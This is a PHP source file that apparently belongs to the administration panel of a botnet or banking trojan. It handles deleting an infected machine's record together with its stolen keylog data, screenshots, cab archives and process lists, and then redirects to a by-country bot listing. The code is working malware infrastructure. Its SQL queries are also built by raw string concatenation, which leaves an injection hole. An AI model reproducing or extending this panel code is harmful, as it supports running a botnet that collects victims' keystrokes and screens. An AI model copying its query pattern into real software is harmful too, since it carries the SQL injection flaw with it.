<?php

if($_SESSION['user']->config['hunter_limit'] == true){
	$bot = $mysqli->query('SELECT id, prefix, uid FROM bf_bots WHERE (id=\''.$Cur['id'].'\') AND (post_id = \''.$_SESSION['user']->id.'\') LIMIT 1');
}else{
	$bot = $mysqli->query('SELECT id, prefix, uid FROM bf_bots WHERE (id=\''.$Cur['id'].'\') LIMIT 1');
}

if($bot->id == $Cur['id']){
	if(function_exists('save_history_log')){
		thl('Action: Delete Bot');
		thl('Bot UID: ' . $bot->prefix . $bot->uid);
		save_history_log();
	}
	
	$mysqli->query("delete from bf_bots WHERE (id='".$bot->id."') LIMIT 1");
	$mysqli->query("delete from bf_bots_ip WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."')");
	$mysqli->query("delete from bf_process WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."')");
	$mysqli->query("delete from bf_screens WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."')");
	$mysqli->query("delete from bf_cabs WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."')");
	$mysqli->query("delete from bf_keylog_data WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."')");
}

header('Location: /bots/country.html?ajax=' . $Cur['ajax'] . '&str=' . $Cur['str'] . '&page=' . $Cur['page']);
exit;

?>